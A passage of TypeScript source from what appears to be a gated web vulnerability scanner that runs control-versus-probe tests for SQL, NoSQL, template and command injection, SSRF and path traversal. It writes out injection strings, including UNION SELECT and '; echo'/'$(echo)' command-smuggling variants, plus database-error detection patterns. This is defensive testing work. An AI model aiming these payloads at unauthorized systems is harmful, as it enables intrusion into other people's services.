        if (echoesQuery) return false
        if (ex.bodySha256 === reference.bodySha256) return false
        if (deterministic) return true
        return responseSimilarity(reference.body, ex.body) < Math.max(0, noise - 0.02)
      }

      const resolveChunk = async (subset: string[]): Promise<void> => {
        const res = await runner.send(build(subset))
        if (!res.ok) {
          if (res.kind === 'approval') runner.stop('approval_required')
          return
        }
        const ex = res.ex
        if (!echoesQuery) {
          for (const n of subset) {
            if (ex.body.includes(values.get(n)!)) {
              anomalies.push({
                kind: 'param', path: basePath, method, status: ex.status, classification: 'reflected_param', param: n,
                reasons: ['probe value reflected in response'], exchangeId: runner.stage(ex),
              })
            }
          }
        }
        if (!changed(ex)) return
        if (subset.length === 1) {
          if (!anomalies.some(a => a.param === subset[0] && a.classification === 'param_effect')) {
            anomalies.push({
              kind: 'param', path: basePath, method, status: ex.status, classification: 'param_effect', param: subset[0],
              mediaType: ex.mediaType, bodyBytes: ex.bodyBytes,
              reasons: [`response diverged from baseline when "${subset[0]}" was supplied`],
              bodyPreview: previewOf(ex), exchangeId: runner.stage(ex),
            })
          }
          return
        }
        const mid = Math.ceil(subset.length / 2)
        await resolveChunk(subset.slice(0, mid))
        await resolveChunk(subset.slice(mid))
      }

      const chunks: string[][] = []
      for (let i = 0; i < names.length; i += batchSize) chunks.push(names.slice(i, i + batchSize))
      await runner.pool(chunks, resolveChunk)
    } else {
      const endpoints = [...new Set([...(req.paths ?? []), ...(req.basePath ? [req.basePath] : [])])]
        .filter(p => safeProbePath(p.split('?')[0])).slice(0, 20)
      if (endpoints.length === 0) throw new BrokerDenied('methods mode requires basePath or paths.')
      const methods = [...new Set<HttpMethod>(req.methods?.length ? req.methods : ['GET', 'HEAD', 'OPTIONS'])]
      candidates = endpoints.length * methods.length
      await runner.pool(endpoints, async path => {
        const baseline = await runner.send({ origin, method: 'GET', pathAndQuery: path })
        const baseStatus = baseline.ok ? baseline.ex.status : null
        if (baseline.ok) runner.stage(baseline.ex)
        for (const method of methods) {
          if (method === 'GET') continue
          const res = await runner.send({ origin, method, pathAndQuery: path })
          if (!res.ok) {
            if (res.kind === 'approval') {
              anomalies.push({
                kind: 'method', path, method, status: 0, classification: 'method_accepted', approvalRequired: true,
                reasons: [`${method} requires Tier 3 operator approval before it can be tested`],
              })
            }
            continue
          }
          const ex = res.ex
          const allow = ex.respHeaders.allow
          if (method === 'OPTIONS' && allow && /\b(?:PUT|DELETE|PATCH|TRACE|CONNECT)\b/i.test(allow)) {
            anomalies.push({
              kind: 'method', path, method, status: ex.status, classification: 'allow_header', allow,
              reasons: [`Allow header advertises unsafe methods: ${allow}`], exchangeId: runner.stage(ex),
            })
          }
          const readOnly = method === 'HEAD' || method === 'OPTIONS'
          if (!readOnly && ex.status < 400) {
            anomalies.push({
              kind: 'method', path, method, status: ex.status, classification: 'method_accepted',
              reasons: [`${method} returned ${ex.status} (GET baseline ${baseStatus ?? 'n/a'})`],
              bodyPreview: previewOf(ex), exchangeId: runner.stage(ex),
            })
          } else if (method === 'HEAD' && baseStatus !== null && ex.status !== baseStatus && ex.status !== 405 && ex.status !== 404) {
            anomalies.push({
              kind: 'method', path, method, status: ex.status, classification: classify(ex.status),
              reasons: [`HEAD status ${ex.status} differs from GET status ${baseStatus}`], exchangeId: runner.stage(ex),
            })
          }
        }
      })
    }
  } catch (err) {
    if (err instanceof StopProbe) {
      // stopReason already recorded on the runner
    } else if (err instanceof BrokerDenied) {
      runner.stopReason ??= 'denied'
      notes.push(err.message)
    } else {
      throw err
    }
  }

  return {
    mode: req.mode,
    origin,
    requestsSent: runner.sent,
    maxRequests: max,
    candidates,
    suppressedAsBaseline,
    suppressedNotFound,
    deniedRequests: runner.denied,
    anomalies,
    calibration,
    baselineSignature,
    stoppedReason: runner.stopReason,
    exchangeIds: runner.exchangeIds,
    notes,
    durationMs: Date.now() - started,
  }
}

// probe_differential: benign, non-destructive control-vs-probe matrices

export type DifferentialProbeClass =
  | 'sqli_boolean' | 'sqli_time_diff' | 'ssti_math' | 'ssrf_canary' | 'nosqli_type'
  | 'path_traversal_benign' | 'graphql_audit' | 'authz_matrix' | 'workflow_invariant'
  | 'xss_context' | 'auth_protocol_audit' | 'xxe_canary' | 'cache_poison_deception' | 'mass_assignment'
  | 'command_injection' | 'csrf_state_change' | 'webhook_signature_bypass' | 'open_redirect_differential'

export interface ProbeDifferentialRequest {
  probeClass: DifferentialProbeClass
  origin: string
  /** Endpoint path+query. authz_matrix requires a {{id}} placeholder. */
  pathAndQuery: string
  method?: 'GET' | 'POST' | 'PUT' | 'PATCH' | 'DELETE'
  /** Parameter under test (sqli_boolean, sqli_time_diff, ssti_math, nosqli_type, xss_context) */
  param?: string
  paramLocation?: SurfaceParamLocation
  jsonBody?: Record<string, unknown>
  formBody?: Record<string, string>
  xmlTemplate?: string
  graphqlQuery?: string
  baselineValue?: string
  persona?: string
  session?: string
  csrfBind?: CsrfBind
  headers?: Record<string, string>
  /** ssrf_canary: candidate URL/webhook/redirect parameter names */
  ssrfParams?: string[]
  injectHeaders?: boolean
  waitMs?: number
  delayMs?: number
  dialect?: 'mysql' | 'postgres' | 'mssql' | 'sqlite'
  customPayload?: string
  candidateFields?: string[]
  jwksUrl?: string
  testHostPoison?: boolean
  runId?: string
  assignmentId?: string
  storage?: Store
  /** authz_matrix function-level bodies (positional array for server actions or keyed object). */
  functionBody?: unknown
  /** authz_matrix & producer-consumer BOLA lifecycle */
  dependencyId?: string
  producerPath?: string
  producerBody?: Record<string, unknown>
  resourceIds?: string[]
  ownerPersona?: string
  otherPersona?: string
  includeAnonymous?: boolean
  includeHeaderBypass?: boolean
  /** workflow_invariant */
  quantityField?: string
  createPath?: string
  expectedTransitions?: string[]
  /** graphql_audit schema-driven SDL resolver fuzzer */
  sdl?: string
  /**
   * csrf_state_change: GET route that exposes the mutated value, the JSON field that carries it,
   * and the mutation body field. `controlValue` restores/keeps the baseline state and
   * `expectedValue` is the value only the tokenless probe write should produce.
   */
  readPath?: string
  stateField?: string
  bodyField?: string
  controlValue?: string | number | boolean
  expectedValue?: string | number | boolean
  /** GET routes to visit before a CSRF control write so the session jar holds the token. */
  csrfPrimePaths?: string[]
  /** Ordered read routes for CSRF state proof (detail page, parent, collection list). */
  readPathCandidates?: string[]
  /** Body encodings the endpoint actually accepts; the CSRF probe must not send a mismatched one. */
  bodyEncodings?: Array<'json' | 'form'>
  /** Identifier used to locate the mutated record inside a collection read. */
  stateRecordId?: string
  /** Foreign Origin header for the tokenless CSRF probe (never sent on the control). */
  foreignOrigin?: string
  /** bodyShape hints for CSRF writes that use an action envelope (e.g. {field,value}). */
  writeBody?: Record<string, unknown>
  /** webhook_signature_bypass: signature header/body hints and read-back state. */
  webhookHeader?: string
  webhookBody?: Record<string, unknown>
  readStateField?: string
  readStateValue?: string | number | boolean
  /** open_redirect_differential: benign target and observed trusted prefixes for prefix-bypass variants. */
  redirectBaseTargets?: string[]
  /** authz_matrix write-path BOLA: verify cross-tenant mutation with an owner read-back. */
  writePathRead?: boolean
  /** authz_matrix: non-entitled viewer actor for secret-marker disclosure scanning. */
  secretScan?: boolean
  viewerPersona?: string
  /** Persona user ids used to interpret ownership fields in cross-persona GraphQL reads. */
  ownerUserId?: string
  otherUserId?: string
  testMutations?: boolean
  maxDepth?: number
  maxAliases?: number
  maxRequests?: number
  /** ssrf_canary: loopback origins published by the target's own config/discovery routes. */
  internalTargets?: string[]
  /** graphql_audit: candidate root fields mined from discovered collection nouns (no SDL needed). */
  graphqlRoots?: string[]
  /** graphql_audit: other-actor object ids harvested from each root's own collection route. */
  graphqlSeedsByRoot?: Record<string, string[]>
  /** auth_protocol_audit: body/header field names that carry a token. */
  tokenFields?: string[]
  /** auth_protocol_audit: session-derived scalar claims for a forged token payload. */
  identityClaims?: Record<string, string>
  /** csrf_state_change: create-shaped write that is read back through its detail template. */
  createReadTemplate?: string
  /** cache_poison_deception: a different resource path that is guaranteed to be a cache miss. */
  crossControlPath?: string
  /** cache_poison_deception: resolved owner/other resource ids (diagnostics + spec selection). */
  crossActorSeeds?: { owner?: string; other?: string }
  /** cache_poison_deception: tenant/store markers observed in each actor's own session claims. */
  actorMarkers?: { owner?: string; other?: string }
  onExchange?: (exchange: BrokerExchangeResult) => string | void
}

export interface DifferentialResult {
  probeClass: DifferentialProbeClass
  origin: string
  pathAndQuery: string
  verdict: 'signal' | 'no_signal' | 'inconclusive'
  summary: string
  anomalies: Array<Record<string, unknown>>
  details: Record<string, unknown>
  requestsSent: number
  exchangeIds: string[]
  stoppedReason: StopReason | null
  notes: string[]
  durationMs: number
}

const dbErrorFingerprints: Array<{ dialect: string; pattern: RegExp }> = [
  { dialect: 'postgresql', pattern: /PostgreSQL.*ERROR|unterminated quoted string at or near|syntax error at or near|PSQLException|org\.postgresql|pg_query\(/i },
  { dialect: 'mysql', pattern: /You have an error in your SQL syntax|MySQLSyntaxErrorException|check the manual that corresponds to your (?:MySQL|MariaDB)|SQLSTATE\[42000\]/i },
  { dialect: 'sqlite', pattern: /SQLITE_ERROR|sqlite3\.OperationalError|SQLite\/JDBCDriver|unrecognized token: |near ".{0,40}": syntax error/i },
  { dialect: 'mssql', pattern: /Unclosed quotation mark after the character string|Microsoft OLE DB Provider for SQL Server|System\.Data\.SqlClient\.SqlException|\[SQL Server\]/i },
  { dialect: 'oracle', pattern: /ORA-\d{5}|Oracle error/i },
]

export function dbErrorDialect(body: string): string | null {
  return dbErrorFingerprints.find(f => f.pattern.test(body))?.dialect ?? null
}

type InjectedRequest = Pick<
  BrokerHttpRequest,
  'pathAndQuery' | 'body' | 'headers' | 'method' | 'persona' | 'session' | 'csrfBind' | 'authMutation' | 'probeClass' | 'cacheVerify' | 'runId' | 'assignmentId'
>

function injectParam(req: ProbeDifferentialRequest, value: string | Record<string, unknown>): InjectedRequest {
  const param = req.param ?? 'q'
  const location: SurfaceParamLocation = req.paramLocation ?? (req.method && req.method !== 'GET' ? 'json' : 'query')
  return injectUniversalParam({
    pathAndQuery: req.pathAndQuery,
    param,
    paramLocation: location,
    value,
    method: req.method === 'DELETE' ? 'POST' : req.method,
    headers: req.headers,
    jsonBody: req.jsonBody,
    formBody: req.formBody,
    xmlTemplate: req.xmlTemplate,
    graphqlQuery: req.graphqlQuery,
    session: req.session,
    csrfBind: req.csrfBind,
    runId: req.runId,
    assignmentId: req.assignmentId,
  })
}

interface DiffContext {
  req: ProbeDifferentialRequest
  origin: string
  runner: ProbeRunner
  notes: string[]
  anomalies: Array<Record<string, unknown>>
  send: (r: InjectedRequest) => Promise<BrokerExchangeResult | null>
}

interface DiffOutcome {
  verdict: DifferentialResult['verdict']
  summary: string
  details: Record<string, unknown>
}

async function diffBooleanDifferential(ctx: DiffContext): Promise<DiffOutcome> {
  const { req, send, anomalies } = ctx
  const baseValue = req.baselineValue ?? '1'
  const baseA = await send(injectParam(req, baseValue))
  const baseB = await send(injectParam(req, baseValue))
  if (!baseA || !baseB) return { verdict: 'inconclusive', summary: 'Baseline requests failed.', details: {} }

  const baselineDialect = dbErrorDialect(baseA.body)
  let detectedErrorDialect: string | null = null
  let consecutive5xx = 0
  let total5xx = 0

  const checkDbError = (ex: BrokerExchangeResult | null) => {
    if (!ex) return
    if (ex.status >= 500) {
      consecutive5xx += 1
      total5xx += 1
    } else {
      consecutive5xx = 0
    }
    const d = dbErrorDialect(ex.body)
    if (d && d !== baselineDialect && !detectedErrorDialect) {
      detectedErrorDialect = d
      anomalies.push({ type: 'db_error_fingerprint', dialect: d })
    }
  }

  // Expanded 9-pattern boolean/syntax matrix. LIKE-wrapped sinks are common (search boxes), so the
  // `%` breakout runs early; the remaining shapes are only worth their requests when the response
  // has already shown it reacts to syntax.
  const styles: Array<{ name: string; orBranch?: boolean; make: (k: number, truth: boolean) => string }> = [
    { name: 'single_quote', make: (k, t) => `${baseValue}' AND ${k}=${t ? k : k + 1}-- -` },
    { name: 'single_paren', make: (k, t) => `${baseValue}') AND ${k}=${t ? k : k + 1}-- -` },
    { name: 'like_breakout', make: (k, t) => `${baseValue}%' AND ${k}=${t ? k : k + 1}-- -` },
    { name: 'or_branch', orBranch: true, make: (k, t) => `${baseValue}' OR ${k}=${t ? k : k + 1}-- -` },
    { name: 'numeric', make: (k, t) => `${baseValue} AND ${k}=${t ? k : k + 1}` },
    { name: 'double_quote', make: (k, t) => `${baseValue}" AND ${k}=${t ? k : k + 1}-- -` },
    { name: 'single_double_paren', make: (k, t) => `${baseValue}')) AND ${k}=${t ? k : k + 1}-- -` },
    { name: 'order_by', make: (k, t) => `${baseValue} ORDER BY (CASE WHEN (${k}=${t ? k : k + 1}) THEN 1 ELSE 2 END)-- -` },
  ]
  const signals: Array<Record<string, unknown>> = []
  let divergentStyles = 0
  let stylesRun = 0
  for (const style of styles) {
    if (consecutive5xx >= 3 || (detectedErrorDialect && total5xx >= 2)) break
    // A parameter the app ignores answers every probe with the byte-identical baseline. Four shapes
    // (including the OR branch, which proves non-LIKE sinks without a baseline) are enough evidence.
    if (stylesRun >= 4 && divergentStyles === 0) break
    stylesRun += 1
    const rounds: Array<Record<string, unknown>> = []
    let pass = true
    for (let r = 0; r < 2; r += 1) {
      if (consecutive5xx >= 3 || (detectedErrorDialect && total5xx >= 2)) { pass = false; break }
      const k = randomInt(1000, 9999)
      const tVal = style.make(k, true)
      const fVal = style.make(k, false)
      const t = await send(injectParam(req, tVal))
      checkDbError(t)
      if (consecutive5xx >= 3 || (detectedErrorDialect && total5xx >= 2)) { pass = false; break }
      const f = await send(injectParam(req, fVal))
      checkDbError(f)
      if (!t || !f) { pass = false; break }
      // JSON sinks often echo the query back. Scrub the injected payload and the baseline value from
      // both sides so the comparison reflects the returned data, not the echo of differing inputs.
      const scrub = (body: string, values: string[]): string => {
        let s = body
        for (const v of values) if (v) s = s.split(v).join('\u0000')
        return s
      }
      const simBaseTrue = responseSimilarity(scrub(baseA.body, [baseValue]), scrub(t.body, [tVal, baseValue]))
      const simBaseFalse = responseSimilarity(scrub(baseA.body, [baseValue]), scrub(f.body, [fVal, baseValue]))
      const simTrueFalse = responseSimilarity(scrub(t.body, [tVal, baseValue]), scrub(f.body, [fVal, baseValue]))
      const statusDiverges = t.status === baseA.status && f.status !== t.status && f.status < 500
      if (simBaseTrue < 0.98 || simBaseFalse < 0.98 || t.status !== baseA.status || f.status !== baseA.status) divergentStyles += 1
      const roundPass = style.orBranch
        ? (t.status < 500 && f.status < 500 && Math.max(simBaseTrue, simBaseFalse) >= 0.9 && (simTrueFalse <= 0.75 || statusDiverges))
        : (t.status < 500 && f.status < 500 && simBaseTrue >= 0.9 && (simTrueFalse <= 0.75 || statusDiverges))
      rounds.push({ k, statusBase: baseA.status, statusTrue: t.status, statusFalse: f.status, simBaseTrue, simTrueFalse, roundPass })
      if (!roundPass) { pass = false; break }
    }
    const passed = pass && rounds.length === 2
    signals.push({ style: style.name, passed, rounds })
    if (passed) break
  }

  let unionSignal: Record<string, unknown> | null = null
  const interesting = divergentStyles > 0 || Boolean(detectedErrorDialect)
  if (!signals.some(s => s.passed) && interesting && consecutive5xx < 3 && !(detectedErrorDialect && total5xx >= 2)) {
    const unionResults: Array<{ cols: number; status: number; simToBase: number }> = []
    for (const cols of [1, 2, 3]) {
      if (consecutive5xx >= 3 || (detectedErrorDialect && total5xx >= 2)) break
      const nulls = Array.from({ length: cols }, () => 'NULL').join(',')
      const ex = await send(injectParam(req, `${baseValue}' UNION SELECT ${nulls}-- -`))
      checkDbError(ex)
      if (!ex) continue
      unionResults.push({ cols, status: ex.status, simToBase: responseSimilarity(baseA.body, ex.body) })
    }
    const ok2xx = unionResults.filter(u => u.status >= 200 && u.status < 300)
    const errNon5xx = unionResults.filter(u => u.status >= 400 && u.status < 500)
    if (ok2xx.length === 1 && (errNon5xx.length >= 1 || unionResults.some(u => u.simToBase <= 0.75))) {
      unionSignal = { style: 'union_null', passed: true, columns: ok2xx[0].cols, results: unionResults }
      signals.push(unionSignal)
    } else if (unionResults.length > 0) {
      signals.push({ style: 'union_null', passed: false, results: unionResults })
    }
  }

  // A lone quote is the cheapest error-fingerprint probe; keep it even when no style diverged.
  const quoteOne = (consecutive5xx < 3 && !(detectedErrorDialect && total5xx >= 2))
    ? await send(injectParam(req, `${baseValue}'`))
    : null
  checkDbError(quoteOne)
  const quoteTwo = (quoteOne && (interesting || Boolean(detectedErrorDialect)) && consecutive5xx < 3 && !(detectedErrorDialect && total5xx >= 2))
    ? await send(injectParam(req, `${baseValue}''`))
    : null
  checkDbError(quoteTwo)

  const errorDialect = detectedErrorDialect ?? (quoteOne ? dbErrorDialect(quoteOne.body) : null)
  const details: Record<string, unknown> = {
    baselineStable: baseA.bodySha256 === baseB.bodySha256 || responseSimilarity(baseA.body, baseB.body) >= 0.98,
    booleanSignals: signals,
    dbErrorDialect: errorDialect && errorDialect !== baselineDialect ? errorDialect : null,
    quoteDelta: quoteOne && quoteTwo
      ? { singleStatus: quoteOne.status, pairedStatus: quoteTwo.status, similarity: responseSimilarity(quoteOne.body, quoteTwo.body) }
      : null,
  }
  const passed = signals.find(s => s.passed)
  let summary = 'No boolean or error differential observed.'
  let verdict: DiffOutcome['verdict'] = 'no_signal'
  if (passed) {
    verdict = 'signal'
    summary = `Boolean differential (${String(passed.style)}) held across randomized rounds: equal-comparison matches baseline, unequal-comparison diverges.`
    anomalies.push({ type: 'boolean_differential', style: passed.style, rounds: passed.rounds ?? passed.results })
  }
  if (details.dbErrorDialect) {
    verdict = 'signal'
    summary = `${passed ? summary + ' ' : ''}${String(details.dbErrorDialect)} database error fingerprint on SQL syntax probe.`
    if (!anomalies.some(a => a.type === 'db_error_fingerprint')) {
      anomalies.push({ type: 'db_error_fingerprint', dialect: details.dbErrorDialect })
    }
  }
  return { verdict, summary, details }
}

const templateSyntaxes: Array<{ engine: string; format: (a: number, b: number) => string }> = [
  { engine: 'jinja2/twig', format: (a, b) => `{{${a}*${b}}}` },
  { engine: 'erb', format: (a, b) => `<%=${a}*${b}%>` },
  { engine: 'freemarker/el', format: (a, b) => '${' + `${a}*${b}` + '}' },
  { engine: 'spel/pebble', format: (a, b) => `#{${a}*${b}}` },
  { engine: 'thymeleaf', format: (a, b) => '[[${' + `${a}*${b}` + '}]]' },
]

async function diffTemplateMath(ctx: DiffContext): Promise<DiffOutcome> {
  const { req, send, anomalies } = ctx
  const baseValue = req.baselineValue ?? 'guardianbase'
  const base = await send(injectParam(req, baseValue))
  if (!base) return { verdict: 'inconclusive', summary: 'Baseline request failed.', details: {} }
  const results: Array<Record<string, unknown>> = []
  for (const syntax of templateSyntaxes) {
    const a = randomPrime(101, 997)
    const b = randomPrime(101, 997, a)
    const expression = syntax.format(a, b)
    const product = String(a * b)
    const ex = await send(injectParam(req, `g${randToken(3)}${expression}g${randToken(3)}`))
    if (!ex) continue
    const evaluated = ex.body.includes(product) && !base.body.includes(product)
    const literalReflected = ex.body.includes(expression)
    results.push({ engine: syntax.engine, expression, product, evaluated, literalReflected, status: ex.status })
    if (evaluated) anomalies.push({ type: 'expression_evaluated', engine: syntax.engine, expression, product, literalReflected })
  }
  const hit = results.find(r => r.evaluated)
  return {
    verdict: hit ? 'signal' : 'no_signal',
    summary: hit
      ? `Server evaluated a randomized arithmetic expression (${String(hit.engine)} syntax); product ${String(hit.product)} appeared only in the probe response.`
      : 'No template expression was evaluated.',
    details: { results },
  }
}

async function diffCanaryCallback(ctx: DiffContext, canaryBroker: CanaryBroker | undefined, grant: Grant, signal: AbortSignal): Promise<DiffOutcome> {
  const { req, send, anomalies, notes } = ctx
  if (!canaryBroker) return { verdict: 'inconclusive', summary: 'CanaryBroker is unavailable; callback probing needs a Guardian-operated listener.', details: {} }
  const params = (req.ssrfParams?.length ? req.ssrfParams : req.param ? [req.param] : []).filter(p => /^[A-Za-z0-9_.\-[\]]{1,64}$/.test(p)).slice(0, 10)
  if (params.length === 0) return { verdict: 'inconclusive', summary: 'ssrfParams (candidate URL parameters) are required.', details: {} }

  let info = canaryBroker.listenerInfo()
  if (!info.running) info = await canaryBroker.startListener()
  const base = info.effectiveBaseUrl
  const localLab = Boolean(grant.allowLocalLab && process.env.GUARDIAN_ALLOW_LOCAL_LAB === '1')
  if (base) {
    let host = ''
    try { host = new URL(base).hostname } catch { /* handled below */ }
    if (!host || (isPrivateOrLoopbackHost(host) && !localLab)) {
      return {
        verdict: 'inconclusive',
        summary: 'Canary base URL is private/loopback; configure GUARDIAN_CANARY_PUBLIC_URL to a public operator-controlled listener before callback probing a public target.',
        details: { canaryHost: host },
      }
    }
  }
  const runId = req.runId ?? 'surface-engine'
  const minted: Array<{ param: string; variant: 'http' | 'dns' | 'header'; token: string }> = []
  const mint = (label: string) => canaryBroker.mintCanary(runId, label, ctx.origin, req.storage ? { storage: req.storage, assignmentId: req.assignmentId } : undefined)

  for (const param of params) {
    const httpCanary = mint(`ssrf:${param}:http`)
    minted.push({ param, variant: 'http', token: httpCanary.token })
    await send(injectParam({ ...req, param }, httpCanary.httpUrl))
    const dnsCanary = mint(`ssrf:${param}:dns`)
    minted.push({ param, variant: 'dns', token: dnsCanary.token })
    await send(injectParam({ ...req, param }, `http://${dnsCanary.dnsHost}/`))
  }
  if (req.injectHeaders) {
    const headerCanary = mint('ssrf:x-forwarded-host')
    minted.push({ param: 'X-Forwarded-Host', variant: 'header', token: headerCanary.token })
    await send({ method: 'GET', pathAndQuery: req.pathAndQuery, headers: { ...(req.headers ?? {}), 'X-Forwarded-Host': headerCanary.dnsHost } })
  }

  // In-band fallback: fetch a loopback origin published by the target's own config/discovery route.
  // The app's egress guard treats these as legitimate service destinations, so a sink that reaches
  // them proves server-side fetch without any OOB callback port.
  const inband: Array<Record<string, unknown>> = []
  const internalTargets = (req.internalTargets ?? []).filter(u => /^https?:\/\/(?:127\.0\.0\.1|localhost|\[::1\]):\d{2,5}(?:\/|$)/i.test(u)).slice(0, 2)
  let inbandHit = false
  if (internalTargets.length > 0) {
    const controlUrl = 'http://guardian-control.invalid/'
    for (const param of params.slice(0, 2)) {
      const control = await send(injectParam({ ...req, param }, controlUrl))
      for (const target of internalTargets) {
        const probe = await send(injectParam({ ...req, param }, target))
        if (!probe) continue
        const sim = control ? responseSimilarity(control.body, probe.body) : 0
        const diverged = !control || probe.status !== control.status || sim < 0.95
        inband.push({ param, target, controlStatus: control?.status ?? null, probeStatus: probe.status, similarity: sim, diverged })
        if (probe.status >= 200 && probe.status < 300 && diverged) {
          anomalies.push({
            type: 'ssrf_inband_differential',
            param,
            internalUrl: target,
            controlUrl,
            controlStatus: control?.status ?? null,
            acceptedStatus: probe.status,
            similarity: sim,
          })
          inbandHit = true
          break
        }
      }
      if (inbandHit) break
    }
  }

  const deadline = Date.now() + Math.max(500, Math.min(req.waitMs ?? 2500, 8000))
  const hits = new Map<string, ReturnType<CanaryBroker['checkCanary']>>()
  while (!signal.aborted) {
    for (const m of minted) {
      const res = canaryBroker.checkCanary(m.token, req.storage ? { storage: req.storage, runId } : undefined)
      if (res.hit) hits.set(m.token, res)
    }
    if (hits.size === minted.length || Date.now() >= deadline) break
    await new Promise<void>(resolve => setTimeout(resolve, 250))
  }
  const results = minted.map(m => {
    const res = hits.get(m.token)
    const first = res?.hits[0]
    return {
      param: m.param, variant: m.variant, token: m.token, hit: Boolean(res),
      protocol: first?.protocol ?? null, queryType: first?.queryType ?? null, remoteIp: first?.remoteIp ?? null,
    }
  })
  for (const r of results.filter(x => x.hit)) {
    anomalies.push({ type: 'canary_callback', param: r.param, variant: r.variant, protocol: r.protocol, token: r.token, remoteIp: r.remoteIp })
  }
  if (!info.dnsRunning) notes.push('DNS callback listener is not running; only HTTP callbacks can be observed.')
  const hitCount = results.filter(r => r.hit).length
  return {
    verdict: hitCount > 0 || inbandHit ? 'signal' : 'no_signal',
    summary: hitCount > 0
      ? `${hitCount} correlated out-of-band callback(s) received from the target for Guardian-minted canary tokens.`
      : inbandHit
        ? 'The sink fetched a loopback service origin published by the target itself (response differential, no OOB callback).'
        : 'No out-of-band callback was observed within the wait window.',
    details: { results, dnsListenerActive: info.dnsRunning, inband },
  }
}

function countRecords(body: string): number | null {
  try {
    const parsed = JSON.parse(body) as unknown
    if (Array.isArray(parsed)) return parsed.length
    if (parsed && typeof parsed === 'object') {
      for (const value of Object.values(parsed as Record<string, unknown>)) if (Array.isArray(value)) return value.length
    }
  } catch { /* not JSON */ }
  return null
}

async function diffOperatorTypes(ctx: DiffContext): Promise<DiffOutcome> {
  const { req, send, anomalies } = ctx
  const marker = `gn${randToken(8)}`
  const base = await send(injectParam(req, marker))
  const neutral = await send(injectParam(req, { gx: marker }))
  const variants: Array<{ name: string; value: Record<string, unknown> }> = [
    { name: 'ne', value: { $ne: marker } },
    { name: 'gt_empty', value: { $gt: '' } },
  ]
  if (!base || !neutral) return { verdict: 'inconclusive', summary: 'Baseline requests failed.', details: {} }
  const results: Array<Record<string, unknown>> = []
  const neutralMatchesBase = neutral.status === base.status && responseSimilarity(base.body, neutral.body) >= 0.9
  for (const variant of variants) {
    const ex = await send(injectParam(req, variant.value))
    if (!ex) continue
    const diverges = ex.status !== base.status || responseSimilarity(base.body, ex.body) < 0.75
    results.push({
      operator: variant.name, status: ex.status, baseStatus: base.status,
      similarityToBaseline: responseSimilarity(base.body, ex.body),
      baseRecords: countRecords(base.body), probeRecords: countRecords(ex.body), diverges,
    })
    if (diverges && neutralMatchesBase && ex.status < 500) {
      anomalies.push({ type: 'operator_type_divergence', operator: variant.name, status: ex.status, neutralMatchesBase: true })
    }
  }
  const hit = results.some(r => r.diverges) && neutralMatchesBase
  return {
    verdict: hit ? 'signal' : 'no_signal',
    summary: hit
      ? 'Query-operator objects changed the response while a neutral object control matched the baseline.'
      : 'Operator-typed values did not change the response relative to the controls.',
    details: { neutralMatchesBase, results },
  }
}

async function diffPathNormalization(ctx: DiffContext): Promise<DiffOutcome> {
  const { req, send, anomalies } = ctx
  const [rawPath, query] = req.pathAndQuery.split('?')
  const qs = query ? `?${query}` : ''
  const segments = rawPath.split('/').filter(Boolean)
  if (segments.length < 2) return { verdict: 'inconclusive', summary: 'Need an existing resource path with at least one directory segment.', details: {} }
  const leaf = segments[segments.length - 1]
  const dirName = segments[segments.length - 2]
  const dir = '/' + segments.slice(0, -1).join('/')
  const orig = await send({ method: 'GET', pathAndQuery: req.pathAndQuery, headers: req.headers })
  if (!orig || orig.status >= 400) return { verdict: 'inconclusive', summary: 'The reference resource must return a 2xx/3xx response.', details: { status: orig?.status ?? null } }
  const missing = `guardian-none-${randToken(6)}`
  const control = await send({ method: 'GET', pathAndQuery: `${dir}/..%2f${missing}/${leaf}${qs}`, headers: req.headers })
  const variants = [
    { name: 'dot_segment', path: `${dir}/./${leaf}${qs}` },
    { name: 'self_parent', path: `${dir}/../${dirName}/${leaf}${qs}` },
    { name: 'encoded_slash', path: `${dir}/..%2f${dirName}/${leaf}${qs}` },
    { name: 'semicolon_segment', path: `${dir}/..;/${dirName}/${leaf}${qs}` },
    { name: 'encoded_dots', path: `${dir}/%2e%2e/${dirName}/${leaf}${qs}` },
  ]
  const controlMatchesOrig = Boolean(control && control.status === orig.status && responseSimilarity(orig.body, control.body) >= 0.98)
  const results: Array<Record<string, unknown>> = []
  for (const variant of variants) {
    const ex = await send({ method: 'GET', pathAndQuery: variant.path, headers: req.headers })
    if (!ex) continue
    const sameAsOriginal = ex.status === orig.status && responseSimilarity(orig.body, ex.body) >= 0.98
    results.push({ variant: variant.name, path: variant.path, status: ex.status, sameAsOriginal })
    if (sameAsOriginal && !controlMatchesOrig && variant.name !== 'dot_segment' && variant.name !== 'self_parent') {
      anomalies.push({ type: 'path_normalization_differential', variant: variant.name, status: ex.status })
    }
  }
  const hit = anomalies.length > 0
  return {
    verdict: hit ? 'signal' : 'no_signal',
    summary: hit
      ? 'Encoded or parameterized parent-segment variants resolve to the same resource while a nonexistent-sibling control does not (normalization differential).'
      : 'Path variants behaved consistently with the nonexistent-sibling control.',
    details: { controlMatchesOrig, controlStatus: control?.status ?? null, results },
  }
}

/**
 * Command-injection nonce oracle. Injects semicolon/subshell/pipe/backtick echo variants into a
 * parameter that plausibly reaches a shell (host/ip/name/path/cmd/diagnostic endpoints). Execution
 * is proven only when the fresh nonce appears in the response while the sent template does not
 * (which rules out plain input reflection).
 */
async function diffCommandInjection(ctx: DiffContext): Promise<DiffOutcome> {
  const { req, send, anomalies } = ctx
  const baseValue = req.baselineValue ?? (req.paramLocation === 'path' ? '1' : '127.0.0.1')
  const base = await send(injectParam(req, baseValue))
  if (!base) return { verdict: 'inconclusive', summary: 'Baseline request failed.', details: {} }
  const nonce = `gn${randToken(10)}`
  const variants: Array<{ name: string; build: (n: string) => string }> = [
    { name: 'semicolon_echo', build: n => `${baseValue}; echo ${n}` },
    { name: 'subshell_echo', build: n => `${baseValue}$(echo ${n})` },
    { name: 'pipe_echo', build: n => `${baseValue} | echo ${n}` },
    { name: 'backtick_echo', build: n => `${baseValue}\`echo ${n}\`` },
  ]
  const results: Array<Record<string, unknown>> = []
  for (const variant of variants) {
    const payload = variant.build(nonce)
    const ex = await send(injectParam(req, payload))
    if (!ex) continue
    const nonceInBody = ex.body.includes(nonce)
    const templateReflected = ex.body.includes(payload)
    const executed = nonceInBody && !templateReflected
    results.push({ variant: variant.name, status: ex.status, nonceInBody, templateReflected, executed })
    if (executed) {
      anomalies.push({
        type: 'command_executed', variant: variant.name, baseValue, nonce,
        status: ex.status, suggestedReplayKind: 'rce_proof',
      })
      return {
        verdict: 'signal',
        summary: `Fresh shell nonce appeared in output for the ${variant.name} variant without template reflection (command executed).`,
        details: { results, baseStatus: base.status, suggestedReplayKind: 'rce_proof' },
      }
    }
  }
  return {
    verdict: 'no_signal',
